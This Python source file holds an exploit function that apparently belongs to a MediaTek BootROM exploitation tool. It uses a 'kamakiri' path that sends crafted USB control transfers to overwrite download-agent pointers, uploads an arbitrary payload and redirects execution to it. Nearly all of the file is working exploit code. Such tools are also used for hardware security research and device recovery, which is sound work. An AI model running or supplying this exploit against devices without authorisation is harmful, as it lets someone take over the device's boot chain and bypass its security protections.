from src.common import to_bytes, from_bytes
from src.logger import log

import usb
import array


def exploit(device, config, payload, arguments):

    def da_read(address, length, check_result = True):
        return da_read_write(0, address, length, None, check_result)

    def da_write(address, length, data, check_result = True):
        return da_read_write(1, address, length, data, check_result)

    def da_read_write(direction, address, length, data = None, check_result = True):
            try:
                device.cmd_da(0,0,1)
                device.read32(addr)
            except:
                pass

            for i in range(3):
                udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da + 8 - 3 + i, 4, '<')))
                udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)

            if address < 0x40:
                for i in range(4):
                    udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da - 6 + (4 - i), 4, '<')))
                    udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
                return device.cmd_da(direction, address, length, data, check_result)
            else:
                for i in range(3):
                    udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(config.ptr_da - 5 + (3 - i), 4, '<')))
                    udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
                return device.cmd_da(direction, address - 0x40, length, data, check_result)


    addr = config.watchdog_address + 0x50

    if not config.ptr_usbdl or arguments.kamakiri:
        log("Using kamakiri")
        device.write32(addr, from_bytes(to_bytes(config.payload_address, 4), 4, '<'))
        if config.var_0:
            readl = config.var_0 + 0x4
            device.read32(addr - config.var_0, readl // 4)
        else:
            cnt = 15
            for i in range(cnt):
                device.read32(addr - (cnt - i) * 4, cnt - i + 1)

        device.echo(0xE0)

        device.echo(len(payload), 4)

        status = device.read(2)
        if from_bytes(status, 2) != 0:
            raise RuntimeError("status is {}".format(status.hex()))

        device.write(payload)

        # clear 4 bytes
        device.read(4)

    udev = device.udev

    try:
        if not config.ptr_usbdl or arguments.kamakiri:
            try:
                # noinspection PyProtectedMember
                udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
            except AttributeError as e:
                raise RuntimeError("libusb is not installed for port {}".format(device.dev.port)) from e
            udev.ctrl_transfer(0xA1, 0, 0, config.var_1, 0)
        else:
            linecode = udev.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
            ptr_send = from_bytes(da_read(config.ptr_usbdl, 4), 4, '<') + 8;
            da_write(config.payload_address, len(payload), payload)
            da_write(ptr_send, 4, to_bytes(config.payload_address, 4, '<'), False)

    except usb.core.USBError as e:
        print(e)

    # We don't need to wait long, if we succeeded
    # noinspection PyBroadException
    try:
        device.dev.timeout = 1
    except Exception:
        pass

    try:
        pattern = device.read(4)
    except usb.core.USBError as e:
        print(e)
        return False

    return pattern
